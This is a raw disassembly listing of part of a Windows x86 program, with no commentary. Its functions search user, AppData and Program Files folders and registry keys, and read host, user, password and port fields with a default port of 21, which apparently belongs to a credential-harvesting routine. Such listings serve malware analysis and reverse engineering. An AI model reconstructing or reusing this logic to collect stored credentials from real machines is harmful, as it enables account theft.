  403abd:	e8 4f 1a 00 00       	call   0x405511
  403ac2:	59                   	pop    %ecx
  403ac3:	bb ff 00 00 00       	mov    $0xff,%ebx
  403ac8:	8d 45 8c             	lea    -0x74(%ebp),%eax
  403acb:	50                   	push   %eax
  403acc:	ff 75 fc             	push   -0x4(%ebp)
  403acf:	ff 15 1c e1 40 00    	call   *0x40e11c
  403ad5:	85 c0                	test   %eax,%eax
  403ad7:	0f 85 b6 00 00 00    	jne    0x403b93
  403add:	8d 45 cc             	lea    -0x34(%ebp),%eax
  403ae0:	50                   	push   %eax
  403ae1:	ff 75 fc             	push   -0x4(%ebp)
  403ae4:	ff 15 1c e1 40 00    	call   *0x40e11c
  403aea:	85 c0                	test   %eax,%eax
  403aec:	0f 85 a1 00 00 00    	jne    0x403b93
  403af2:	ff 75 08             	push   0x8(%ebp)
  403af5:	53                   	push   %ebx
  403af6:	57                   	push   %edi
  403af7:	50                   	push   %eax
  403af8:	8d 45 dc             	lea    -0x24(%ebp),%eax
  403afb:	50                   	push   %eax
  403afc:	ff 75 fc             	push   -0x4(%ebp)
  403aff:	ff d6                	call   *%esi
  403b01:	85 c0                	test   %eax,%eax
  403b03:	0f 86 8a 00 00 00    	jbe    0x403b93
  403b09:	ff 75 08             	push   0x8(%ebp)
  403b0c:	8d 87 fe 01 00 00    	lea    0x1fe(%edi),%eax
  403b12:	53                   	push   %ebx
  403b13:	50                   	push   %eax
  403b14:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403b17:	6a 00                	push   $0x0
  403b19:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403b1c:	50                   	push   %eax
  403b1d:	ff 75 fc             	push   -0x4(%ebp)
  403b20:	ff d6                	call   *%esi
  403b22:	85 c0                	test   %eax,%eax
  403b24:	76 6d                	jbe    0x403b93
  403b26:	ff 75 08             	push   0x8(%ebp)
  403b29:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  403b2c:	53                   	push   %ebx
  403b2d:	ff 75 f8             	push   -0x8(%ebp)
  403b30:	6a 00                	push   $0x0
  403b32:	50                   	push   %eax
  403b33:	ff 75 fc             	push   -0x4(%ebp)
  403b36:	ff d6                	call   *%esi
  403b38:	85 c0                	test   %eax,%eax
  403b3a:	76 57                	jbe    0x403b93
  403b3c:	ff 75 f8             	push   -0x8(%ebp)
  403b3f:	e8 33 fd ff ff       	call   0x403877
  403b44:	85 c0                	test   %eax,%eax
  403b46:	59                   	pop    %ecx
  403b47:	7e 4a                	jle    0x403b93
  403b49:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  403b4f:	50                   	push   %eax
  403b50:	ba 40 e9 40 00       	mov    $0x40e940,%edx
  403b55:	e8 b7 19 00 00       	call   0x405511
  403b5a:	59                   	pop    %ecx
  403b5b:	57                   	push   %edi
  403b5c:	ff 75 f8             	push   -0x8(%ebp)
  403b5f:	8b 7d f4             	mov    -0xc(%ebp),%edi
  403b62:	ff 75 e8             	push   -0x18(%ebp)
  403b65:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  403b6b:	50                   	push   %eax
  403b6c:	ba 07 03 00 00       	mov    $0x307,%edx
  403b71:	e8 83 88 00 00       	call   0x40c3f9
  403b76:	83 c4 10             	add    $0x10,%esp
  403b79:	85 c0                	test   %eax,%eax
  403b7b:	7e 13                	jle    0x403b90
  403b7d:	57                   	push   %edi
  403b7e:	8b 7d 0c             	mov    0xc(%ebp),%edi
  403b81:	8b cf                	mov    %edi,%ecx
  403b83:	e8 83 84 00 00       	call   0x40c00b
  403b88:	84 c0                	test   %al,%al
  403b8a:	59                   	pop    %ecx
  403b8b:	74 03                	je     0x403b90
  403b8d:	ff 47 04             	incl   0x4(%edi)
  403b90:	8b 7d f0             	mov    -0x10(%ebp),%edi
  403b93:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  403b96:	6a 01                	push   $0x1
  403b98:	e8 f8 88 00 00       	call   0x40c495
  403b9d:	85 c0                	test   %eax,%eax
  403b9f:	59                   	pop    %ecx
  403ba0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403ba3:	0f 85 1f ff ff ff    	jne    0x403ac8
  403ba9:	57                   	push   %edi
  403baa:	e8 8b 82 00 00       	call   0x40be3a
  403baf:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  403bb2:	59                   	pop    %ecx
  403bb3:	53                   	push   %ebx
  403bb4:	e8 81 82 00 00       	call   0x40be3a
  403bb9:	59                   	pop    %ecx
  403bba:	5f                   	pop    %edi
  403bbb:	5e                   	pop    %esi
  403bbc:	5b                   	pop    %ebx
  403bbd:	c9                   	leave
  403bbe:	c3                   	ret
  403bbf:	55                   	push   %ebp
  403bc0:	8b ec                	mov    %esp,%ebp
  403bc2:	83 e4 f8             	and    $0xfffffff8,%esp
  403bc5:	81 ec 0c 02 00 00    	sub    $0x20c,%esp
  403bcb:	56                   	push   %esi
  403bcc:	ff 75 08             	push   0x8(%ebp)
  403bcf:	8b 75 0c             	mov    0xc(%ebp),%esi
  403bd2:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  403bd6:	8d 46 2c             	lea    0x2c(%esi),%eax
  403bd9:	51                   	push   %ecx
  403bda:	e8 3d 46 00 00       	call   0x40821c
  403bdf:	84 c0                	test   %al,%al
  403be1:	59                   	pop    %ecx
  403be2:	59                   	pop    %ecx
  403be3:	74 24                	je     0x403c09
  403be5:	f6 06 10             	testb  $0x10,(%esi)
  403be8:	8d 44 24 08          	lea    0x8(%esp),%eax
  403bec:	74 10                	je     0x403bfe
  403bee:	6a 01                	push   $0x1
  403bf0:	ff 75 10             	push   0x10(%ebp)
  403bf3:	50                   	push   %eax
  403bf4:	e8 aa fd ff ff       	call   0x4039a3
  403bf9:	83 c4 0c             	add    $0xc,%esp
  403bfc:	eb 0b                	jmp    0x403c09
  403bfe:	ff 75 10             	push   0x10(%ebp)
  403c01:	50                   	push   %eax
  403c02:	e8 e3 fd ff ff       	call   0x4039ea
  403c07:	59                   	pop    %ecx
  403c08:	59                   	pop    %ecx
  403c09:	b0 01                	mov    $0x1,%al
  403c0b:	5e                   	pop    %esi
  403c0c:	8b e5                	mov    %ebp,%esp
  403c0e:	5d                   	pop    %ebp
  403c0f:	c3                   	ret
  403c10:	55                   	push   %ebp
  403c11:	8b ec                	mov    %esp,%ebp
  403c13:	81 ec 14 05 00 00    	sub    $0x514,%esp
  403c19:	53                   	push   %ebx
  403c1a:	56                   	push   %esi
  403c1b:	57                   	push   %edi
  403c1c:	6a 08                	push   $0x8
  403c1e:	6a 00                	push   $0x0
  403c20:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403c23:	50                   	push   %eax
  403c24:	e8 74 82 00 00       	call   0x40be9d
  403c29:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  403c2f:	bb 60 e7 40 00       	mov    $0x40e760,%ebx
  403c34:	50                   	push   %eax
  403c35:	8b d3                	mov    %ebx,%edx
  403c37:	e8 d5 18 00 00       	call   0x405511
  403c3c:	59                   	pop    %ecx
  403c3d:	8d 45 94             	lea    -0x6c(%ebp),%eax
  403c40:	50                   	push   %eax
  403c41:	ba 44 e7 40 00       	mov    $0x40e744,%edx
  403c46:	e8 c6 18 00 00       	call   0x405511
  403c4b:	59                   	pop    %ecx
  403c4c:	be 04 01 00 00       	mov    $0x104,%esi
  403c51:	56                   	push   %esi
  403c52:	8d 45 94             	lea    -0x6c(%ebp),%eax
  403c55:	50                   	push   %eax
  403c56:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  403c5c:	50                   	push   %eax
  403c5d:	8d bd f8 fc ff ff    	lea    -0x308(%ebp),%edi
  403c63:	b8 01 00 00 80       	mov    $0x80000001,%eax
  403c68:	e8 22 48 00 00       	call   0x40848f
  403c6d:	83 c4 0c             	add    $0xc,%esp
  403c70:	83 f8 ff             	cmp    $0xffffffff,%eax
  403c73:	74 34                	je     0x403ca9
  403c75:	85 c0                	test   %eax,%eax
  403c77:	76 30                	jbe    0x403ca9
  403c79:	56                   	push   %esi
  403c7a:	8d 85 f0 fa ff ff    	lea    -0x510(%ebp),%eax
  403c80:	50                   	push   %eax
  403c81:	8b c7                	mov    %edi,%eax
  403c83:	50                   	push   %eax
  403c84:	ff 15 7c e0 40 00    	call   *0x40e07c
  403c8a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403c8d:	50                   	push   %eax
  403c8e:	8d 85 f0 fa ff ff    	lea    -0x510(%ebp),%eax
  403c94:	50                   	push   %eax
  403c95:	e8 50 fd ff ff       	call   0x4039ea
  403c9a:	59                   	pop    %ecx
  403c9b:	59                   	pop    %ecx
  403c9c:	8d 85 f0 fa ff ff    	lea    -0x510(%ebp),%eax
  403ca2:	50                   	push   %eax
  403ca3:	ff 15 30 e1 40 00    	call   *0x40e130
  403ca9:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403cad:	0f 85 4b 01 00 00    	jne    0x403dfe
  403cb3:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403cb6:	50                   	push   %eax
  403cb7:	ba 14 e7 40 00       	mov    $0x40e714,%edx
  403cbc:	e8 50 18 00 00       	call   0x405511
  403cc1:	59                   	pop    %ecx
  403cc2:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
  403cc8:	50                   	push   %eax
  403cc9:	ba f0 e6 40 00       	mov    $0x40e6f0,%edx
  403cce:	e8 3e 18 00 00       	call   0x405511
  403cd3:	59                   	pop    %ecx
  403cd4:	8d 45 ac             	lea    -0x54(%ebp),%eax
  403cd7:	50                   	push   %eax
  403cd8:	ba dc e6 40 00       	mov    $0x40e6dc,%edx
  403cdd:	e8 2f 18 00 00       	call   0x405511
  403ce2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403ce6:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403ce9:	89 45 e8             	mov    %eax,-0x18(%ebp)
  403cec:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
  403cf2:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403cf5:	8d 45 ac             	lea    -0x54(%ebp),%eax
  403cf8:	59                   	pop    %ecx
  403cf9:	c7 45 d8 24 00 00 00 	movl   $0x24,-0x28(%ebp)
  403d00:	c7 45 dc 1a 00 00 00 	movl   $0x1a,-0x24(%ebp)
  403d07:	c7 45 e0 26 00 00 00 	movl   $0x26,-0x20(%ebp)
  403d0e:	c7 45 e4 23 00 00 00 	movl   $0x23,-0x1c(%ebp)
  403d15:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403d18:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403d1b:	8b 7c 85 d8          	mov    -0x28(%ebp,%eax,4),%edi
  403d1f:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  403d25:	50                   	push   %eax
  403d26:	33 c0                	xor    %eax,%eax
  403d28:	50                   	push   %eax
  403d29:	50                   	push   %eax
  403d2a:	57                   	push   %edi
  403d2b:	50                   	push   %eax
  403d2c:	ff 15 14 e1 40 00    	call   *0x40e114
  403d32:	85 c0                	test   %eax,%eax
  403d34:	75 49                	jne    0x403d7f
  403d36:	83 ff 24             	cmp    $0x24,%edi
  403d39:	75 1f                	jne    0x403d5a
  403d3b:	33 ff                	xor    %edi,%edi
  403d3d:	57                   	push   %edi
  403d3e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403d41:	50                   	push   %eax
  403d42:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  403d48:	50                   	push   %eax
  403d49:	e8 55 fc ff ff       	call   0x4039a3
  403d4e:	83 c4 0c             	add    $0xc,%esp
  403d51:	66 89 bd fe fc ff ff 	mov    %di,-0x302(%ebp)
  403d58:	eb 02                	jmp    0x403d5c
  403d5a:	33 ff                	xor    %edi,%edi
  403d5c:	57                   	push   %edi
  403d5d:	57                   	push   %edi
  403d5e:	57                   	push   %edi
  403d5f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403d62:	50                   	push   %eax
  403d63:	68 bf 3b 40 00       	push   $0x403bbf
  403d68:	6a 02                	push   $0x2
  403d6a:	6a 03                	push   $0x3
  403d6c:	8d 45 e8             	lea    -0x18(%ebp),%eax
  403d6f:	50                   	push   %eax
  403d70:	8d 85 f8 fc ff ff    	lea    -0x308(%ebp),%eax
  403d76:	50                   	push   %eax
  403d77:	e8 cc 44 00 00       	call   0x408248
  403d7c:	83 c4 24             	add    $0x24,%esp
  403d7f:	ff 45 fc             	incl   -0x4(%ebp)
  403d82:	83 7d fc 04          	cmpl   $0x4,-0x4(%ebp)
  403d86:	72 90                	jb     0x403d18
  403d88:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403d8c:	75 70                	jne    0x403dfe
  403d8e:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  403d94:	50                   	push   %eax
  403d95:	8b d3                	mov    %ebx,%edx
  403d97:	e8 75 17 00 00       	call   0x405511
  403d9c:	59                   	pop    %ecx
  403d9d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403da0:	50                   	push   %eax
  403da1:	ba 2c e7 40 00       	mov    $0x40e72c,%edx
  403da6:	e8 66 17 00 00       	call   0x405511
  403dab:	59                   	pop    %ecx
  403dac:	56                   	push   %esi
  403dad:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403db0:	50                   	push   %eax
  403db1:	8d 85 48 ff ff ff    	lea    -0xb8(%ebp),%eax
  403db7:	50                   	push   %eax
  403db8:	8d bd f8 fc ff ff    	lea    -0x308(%ebp),%edi
  403dbe:	b8 01 00 00 80       	mov    $0x80000001,%eax
  403dc3:	e8 c7 46 00 00       	call   0x40848f
  403dc8:	83 c4 0c             	add    $0xc,%esp
  403dcb:	83 f8 ff             	cmp    $0xffffffff,%eax
  403dce:	74 2a                	je     0x403dfa
  403dd0:	85 c0                	test   %eax,%eax
  403dd2:	76 26                	jbe    0x403dfa
  403dd4:	56                   	push   %esi
  403dd5:	8d 85 f0 fa ff ff    	lea    -0x510(%ebp),%eax
  403ddb:	50                   	push   %eax
  403ddc:	8b c7                	mov    %edi,%eax
  403dde:	50                   	push   %eax
  403ddf:	ff 15 7c e0 40 00    	call   *0x40e07c
  403de5:	6a 01                	push   $0x1
  403de7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  403dea:	50                   	push   %eax
  403deb:	8d 85 f0 fa ff ff    	lea    -0x510(%ebp),%eax
  403df1:	50                   	push   %eax
  403df2:	e8 ac fb ff ff       	call   0x4039a3
  403df7:	83 c4 0c             	add    $0xc,%esp
  403dfa:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403dfe:	76 0a                	jbe    0x403e0a
  403e00:	8b 75 f4             	mov    -0xc(%ebp),%esi
  403e03:	e8 98 f5 ff ff       	call   0x4033a0
  403e08:	eb 09                	jmp    0x403e13
  403e0a:	ff 75 f4             	push   -0xc(%ebp)
  403e0d:	e8 28 80 00 00       	call   0x40be3a
  403e12:	59                   	pop    %ecx
  403e13:	5f                   	pop    %edi
  403e14:	5e                   	pop    %esi
  403e15:	5b                   	pop    %ebx
  403e16:	c9                   	leave
  403e17:	c3                   	ret
  403e18:	55                   	push   %ebp
  403e19:	8b ec                	mov    %esp,%ebp
  403e1b:	83 e4 f8             	and    $0xfffffff8,%esp
  403e1e:	81 ec a4 02 00 00    	sub    $0x2a4,%esp
  403e24:	53                   	push   %ebx
  403e25:	56                   	push   %esi
  403e26:	8b 75 0c             	mov    0xc(%ebp),%esi
  403e29:	57                   	push   %edi
  403e2a:	ff 75 08             	push   0x8(%ebp)
  403e2d:	8d 8c 24 ac 00 00 00 	lea    0xac(%esp),%ecx
  403e34:	8d 46 2c             	lea    0x2c(%esi),%eax
  403e37:	51                   	push   %ecx
  403e38:	e8 df 43 00 00       	call   0x40821c
  403e3d:	84 c0                	test   %al,%al
  403e3f:	59                   	pop    %ecx
  403e40:	59                   	pop    %ecx
  403e41:	0f 84 97 02 00 00    	je     0x4040de
  403e47:	f6 06 10             	testb  $0x10,(%esi)
  403e4a:	74 43                	je     0x403e8f
  403e4c:	8d 44 24 38          	lea    0x38(%esp),%eax
  403e50:	50                   	push   %eax
  403e51:	ba d0 e6 40 00       	mov    $0x40e6d0,%edx
  403e56:	e8 b6 16 00 00       	call   0x405511
  403e5b:	59                   	pop    %ecx
  403e5c:	8d 44 24 38          	lea    0x38(%esp),%eax
  403e60:	89 44 24 14          	mov    %eax,0x14(%esp)
  403e64:	33 c0                	xor    %eax,%eax
  403e66:	50                   	push   %eax
  403e67:	50                   	push   %eax
  403e68:	50                   	push   %eax
  403e69:	ff 75 10             	push   0x10(%ebp)
  403e6c:	8d 44 24 24          	lea    0x24(%esp),%eax
  403e70:	68 18 3e 40 00       	push   $0x403e18
  403e75:	6a 05                	push   $0x5
  403e77:	6a 01                	push   $0x1
  403e79:	50                   	push   %eax
  403e7a:	8d 84 24 c8 00 00 00 	lea    0xc8(%esp),%eax
  403e81:	50                   	push   %eax
  403e82:	e8 c1 43 00 00       	call   0x408248
  403e87:	83 c4 24             	add    $0x24,%esp
  403e8a:	e9 4f 02 00 00       	jmp    0x4040de
  403e8f:	8d 84 24 a8 00 00 00 	lea    0xa8(%esp),%eax
  403e96:	50                   	push   %eax
  403e97:	e8 7d 86 00 00       	call   0x40c519
  403e9c:	8b f0                	mov    %eax,%esi
  403e9e:	85 f6                	test   %esi,%esi
  403ea0:	59                   	pop    %ecx
  403ea1:	89 74 24 34          	mov    %esi,0x34(%esp)
  403ea5:	0f 84 33 02 00 00    	je     0x4040de
  403eab:	8d 44 24 68          	lea    0x68(%esp),%eax
  403eaf:	50                   	push   %eax
  403eb0:	ba b8 e6 40 00       	mov    $0x40e6b8,%edx
  403eb5:	e8 57 16 00 00       	call   0x405511
  403eba:	8b 06                	mov    (%esi),%eax
  403ebc:	59                   	pop    %ecx
  403ebd:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  403ec1:	51                   	push   %ecx
  403ec2:	8d 4c 24 6c          	lea    0x6c(%esp),%ecx
  403ec6:	51                   	push   %ecx
  403ec7:	56                   	push   %esi
  403ec8:	ff 90 90 00 00 00    	call   *0x90(%eax)
  403ece:	85 c0                	test   %eax,%eax
  403ed0:	0f 85 02 02 00 00    	jne    0x4040d8
  403ed6:	8b 44 24 14          	mov    0x14(%esp),%eax
  403eda:	8b 08                	mov    (%eax),%ecx
  403edc:	8d 54 24 10          	lea    0x10(%esp),%edx
  403ee0:	52                   	push   %edx
  403ee1:	50                   	push   %eax
  403ee2:	ff 51 24             	call   *0x24(%ecx)
  403ee5:	85 c0                	test   %eax,%eax
  403ee7:	0f 85 e1 01 00 00    	jne    0x4040ce
  403eed:	8d 44 24 5c          	lea    0x5c(%esp),%eax
  403ef1:	50                   	push   %eax
  403ef2:	ba ac e6 40 00       	mov    $0x40e6ac,%edx
  403ef7:	e8 15 16 00 00       	call   0x405511
  403efc:	8b 44 24 14          	mov    0x14(%esp),%eax
  403f00:	59                   	pop    %ecx
  403f01:	8b 08                	mov    (%eax),%ecx
  403f03:	8d 54 24 28          	lea    0x28(%esp),%edx
  403f07:	52                   	push   %edx
  403f08:	8d 54 24 60          	lea    0x60(%esp),%edx
  403f0c:	52                   	push   %edx
  403f0d:	50                   	push   %eax
  403f0e:	ff 91 94 00 00 00    	call   *0x94(%ecx)
  403f14:	85 c0                	test   %eax,%eax
  403f16:	75 0f                	jne    0x403f27
  403f18:	8b 74 24 28          	mov    0x28(%esp),%esi
  403f1c:	e8 77 86 00 00       	call   0x40c598
  403f21:	89 44 24 18          	mov    %eax,0x18(%esp)
  403f25:	eb 05                	jmp    0x403f2c
  403f27:	83 64 24 18 00       	andl   $0x0,0x18(%esp)
  403f2c:	8d 44 24 44          	lea    0x44(%esp),%eax
  403f30:	50                   	push   %eax
  403f31:	ba a0 e6 40 00       	mov    $0x40e6a0,%edx
  403f36:	e8 d6 15 00 00       	call   0x405511
  403f3b:	8b 44 24 14          	mov    0x14(%esp),%eax
  403f3f:	59                   	pop    %ecx
  403f40:	8b 08                	mov    (%eax),%ecx
  403f42:	8d 54 24 30          	lea    0x30(%esp),%edx
  403f46:	52                   	push   %edx
  403f47:	8d 54 24 48          	lea    0x48(%esp),%edx
  403f4b:	52                   	push   %edx
  403f4c:	50                   	push   %eax
  403f4d:	ff 91 94 00 00 00    	call   *0x94(%ecx)
  403f53:	85 c0                	test   %eax,%eax
  403f55:	75 0f                	jne    0x403f66
  403f57:	8b 74 24 30          	mov    0x30(%esp),%esi
  403f5b:	e8 38 86 00 00       	call   0x40c598
  403f60:	89 44 24 20          	mov    %eax,0x20(%esp)
  403f64:	eb 05                	jmp    0x403f6b
  403f66:	83 64 24 20 00       	andl   $0x0,0x20(%esp)
  403f6b:	8d 44 24 50          	lea    0x50(%esp),%eax
  403f6f:	50                   	push   %eax
  403f70:	ba 94 e6 40 00       	mov    $0x40e694,%edx
  403f75:	e8 97 15 00 00       	call   0x405511
  403f7a:	8b 44 24 14          	mov    0x14(%esp),%eax
  403f7e:	59                   	pop    %ecx
  403f7f:	8b 08                	mov    (%eax),%ecx
  403f81:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  403f85:	52                   	push   %edx
  403f86:	8d 54 24 54          	lea    0x54(%esp),%edx
  403f8a:	52                   	push   %edx
  403f8b:	50                   	push   %eax
  403f8c:	ff 91 94 00 00 00    	call   *0x94(%ecx)
  403f92:	85 c0                	test   %eax,%eax
  403f94:	75 0d                	jne    0x403fa3
  403f96:	8b 74 24 2c          	mov    0x2c(%esp),%esi
  403f9a:	e8 f9 85 00 00       	call   0x40c598
  403f9f:	8b d8                	mov    %eax,%ebx
  403fa1:	eb 02                	jmp    0x403fa5
  403fa3:	33 db                	xor    %ebx,%ebx
  403fa5:	8d 44 24 38          	lea    0x38(%esp),%eax
  403fa9:	50                   	push   %eax
  403faa:	ba 88 e6 40 00       	mov    $0x40e688,%edx
  403faf:	e8 5d 15 00 00       	call   0x405511
  403fb4:	8b 44 24 14          	mov    0x14(%esp),%eax
  403fb8:	59                   	pop    %ecx
  403fb9:	8b 08                	mov    (%eax),%ecx
  403fbb:	8d 54 24 24          	lea    0x24(%esp),%edx
  403fbf:	52                   	push   %edx
  403fc0:	8d 54 24 3c          	lea    0x3c(%esp),%edx
  403fc4:	52                   	push   %edx
  403fc5:	50                   	push   %eax
  403fc6:	ff 91 94 00 00 00    	call   *0x94(%ecx)
  403fcc:	85 c0                	test   %eax,%eax
  403fce:	75 0d                	jne    0x403fdd
  403fd0:	8b 74 24 24          	mov    0x24(%esp),%esi
  403fd4:	e8 bf 85 00 00       	call   0x40c598
  403fd9:	8b f8                	mov    %eax,%edi
  403fdb:	eb 02                	jmp    0x403fdf
  403fdd:	33 ff                	xor    %edi,%edi
  403fdf:	8b 44 24 18          	mov    0x18(%esp),%eax
  403fe3:	33 f6                	xor    %esi,%esi
  403fe5:	3b c6                	cmp    %esi,%eax
  403fe7:	0f 84 9a 00 00 00    	je     0x404087
  403fed:	66 39 30             	cmp    %si,(%eax)
  403ff0:	0f 84 91 00 00 00    	je     0x404087
  403ff6:	3b de                	cmp    %esi,%ebx
  403ff8:	0f 84 89 00 00 00    	je     0x404087
  403ffe:	66 39 33             	cmp    %si,(%ebx)
  404001:	0f 84 80 00 00 00    	je     0x404087
  404007:	3b fe                	cmp    %esi,%edi
  404009:	74 7c                	je     0x404087
  40400b:	66 39 37             	cmp    %si,(%edi)
  40400e:	74 77                	je     0x404087
  404010:	8b 44 24 20          	mov    0x20(%esp),%eax
  404014:	3b c6                	cmp    %esi,%eax
  404016:	74 07                	je     0x40401f
  404018:	e8 77 81 00 00       	call   0x40c194
  40401d:	8b f0                	mov    %eax,%esi
  40401f:	83 fe 01             	cmp    $0x1,%esi
  404022:	72 08                	jb     0x40402c
  404024:	81 fe ff ff 00 00    	cmp    $0xffff,%esi
  40402a:	76 03                	jbe    0x40402f
  40402c:	6a 15                	push   $0x15
  40402e:	5e                   	pop    %esi
  40402f:	83 64 24 1c 00       	andl   $0x0,0x1c(%esp)
  404034:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  40403b:	50                   	push   %eax
  40403c:	ba 60 e9 40 00       	mov    $0x40e960,%edx
  404041:	e8 cb 14 00 00       	call   0x405511
  404046:	59                   	pop    %ecx
  404047:	56                   	push   %esi
  404048:	ff 74 24 1c          	push   0x1c(%esp)
  40404c:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  404053:	57                   	push   %edi
  404054:	53                   	push   %ebx
  404055:	50                   	push   %eax
  404056:	8d 44 24 30          	lea    0x30(%esp),%eax
  40405a:	50                   	push   %eax
  40405b:	e8 dd 83 00 00       	call   0x40c43d
  404060:	83 c4 18             	add    $0x18,%esp
  404063:	85 c0                	test   %eax,%eax
  404065:	7e 16                	jle    0x40407d
  404067:	8b 75 10             	mov    0x10(%ebp),%esi
  40406a:	ff 74 24 1c          	push   0x1c(%esp)
  40406e:	8b ce                	mov    %esi,%ecx
  404070:	e8 96 7f 00 00       	call   0x40c00b
  404075:	84 c0                	test   %al,%al
  404077:	59                   	pop    %ecx
  404078:	74 03                	je     0x40407d
  40407a:	ff 46 04             	incl   0x4(%esi)
  40407d:	ff 74 24 1c          	push   0x1c(%esp)
  404081:	e8 b4 7d 00 00       	call   0x40be3a
  404086:	59                   	pop    %ecx
  404087:	ff 74 24 18          	push   0x18(%esp)
  40408b:	e8 29 85 00 00       	call   0x40c5b9
  404090:	59                   	pop    %ecx
  404091:	ff 74 24 20          	push   0x20(%esp)
  404095:	e8 1f 85 00 00       	call   0x40c5b9
  40409a:	59                   	pop    %ecx
  40409b:	53                   	push   %ebx
  40409c:	e8 18 85 00 00       	call   0x40c5b9
  4040a1:	59                   	pop    %ecx
  4040a2:	57                   	push   %edi
  4040a3:	e8 11 85 00 00       	call   0x40c5b9
  4040a8:	8b 44 24 14          	mov    0x14(%esp),%eax
  4040ac:	59                   	pop    %ecx
  4040ad:	8b 08                	mov    (%eax),%ecx
  4040af:	50                   	push   %eax
  4040b0:	ff 51 08             	call   *0x8(%ecx)
  4040b3:	8b 44 24 14          	mov    0x14(%esp),%eax
  4040b7:	8b 08                	mov    (%eax),%ecx
  4040b9:	8d 54 24 10          	lea    0x10(%esp),%edx
  4040bd:	52                   	push   %edx
  4040be:	50                   	push   %eax
  4040bf:	ff 51 24             	call   *0x24(%ecx)
  4040c2:	85 c0                	test   %eax,%eax
  4040c4:	0f 84 23 fe ff ff    	je     0x403eed
  4040ca:	8b 74 24 34          	mov    0x34(%esp),%esi
  4040ce:	8b 44 24 14          	mov    0x14(%esp),%eax
  4040d2:	8b 08                	mov    (%eax),%ecx
  4040d4:	50                   	push   %eax
  4040d5:	ff 51 08             	call   *0x8(%ecx)
  4040d8:	8b 06                	mov    (%esi),%eax
  4040da:	56                   	push   %esi
  4040db:	ff 50 08             	call   *0x8(%eax)
  4040de:	5f                   	pop    %edi
  4040df:	5e                   	pop    %esi
  4040e0:	b0 01                	mov    $0x1,%al
  4040e2:	5b                   	pop    %ebx
  4040e3:	8b e5                	mov    %ebp,%esp
  4040e5:	5d                   	pop    %ebp
  4040e6:	c3                   	ret
  4040e7:	55                   	push   %ebp
  4040e8:	8b ec                	mov    %esp,%ebp
  4040ea:	81 ec 38 02 00 00    	sub    $0x238,%esp
  4040f0:	56                   	push   %esi
  4040f1:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4040f4:	57                   	push   %edi
  4040f5:	50                   	push   %eax
  4040f6:	ba 70 e6 40 00       	mov    $0x40e670,%edx
  4040fb:	e8 11 14 00 00       	call   0x405511
  404100:	59                   	pop    %ecx
  404101:	8d 45 d0             	lea    -0x30(%ebp),%eax
  404104:	6a 08                	push   $0x8
  404106:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404109:	33 f6                	xor    %esi,%esi
  40410b:	56                   	push   %esi
  40410c:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40410f:	50                   	push   %eax
  404110:	c7 45 e8 26 00 00 00 	movl   $0x26,-0x18(%ebp)
  404117:	c7 45 ec 1a 00 00 00 	movl   $0x1a,-0x14(%ebp)
  40411e:	c7 45 f0 23 00 00 00 	movl   $0x23,-0x10(%ebp)
  404125:	e8 73 7d 00 00       	call   0x40be9d
  40412a:	33 ff                	xor    %edi,%edi
  40412c:	8d 85 c8 fd ff ff    	lea    -0x238(%ebp),%eax
  404132:	50                   	push   %eax
  404133:	56                   	push   %esi
  404134:	56                   	push   %esi
  404135:	ff 74 bd e8          	push   -0x18(%ebp,%edi,4)
  404139:	56                   	push   %esi
  40413a:	ff 15 14 e1 40 00    	call   *0x40e114
  404140:	85 c0                	test   %eax,%eax
  404142:	75 23                	jne    0x404167
  404144:	56                   	push   %esi
  404145:	56                   	push   %esi
  404146:	56                   	push   %esi
  404147:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40414a:	50                   	push   %eax
  40414b:	68 18 3e 40 00       	push   $0x403e18
  404150:	6a 02                	push   $0x2
  404152:	6a 01                	push   $0x1
  404154:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404157:	50                   	push   %eax
  404158:	8d 85 c8 fd ff ff    	lea    -0x238(%ebp),%eax
  40415e:	50                   	push   %eax
  40415f:	e8 e4 40 00 00       	call   0x408248
  404164:	83 c4 24             	add    $0x24,%esp
  404167:	47                   	inc    %edi
  404168:	83 ff 03             	cmp    $0x3,%edi
  40416b:	72 bf                	jb     0x40412c
  40416d:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  404170:	76 0a                	jbe    0x40417c
  404172:	8b 75 f8             	mov    -0x8(%ebp),%esi
  404175:	e8 26 f2 ff ff       	call   0x4033a0
  40417a:	eb 09                	jmp    0x404185
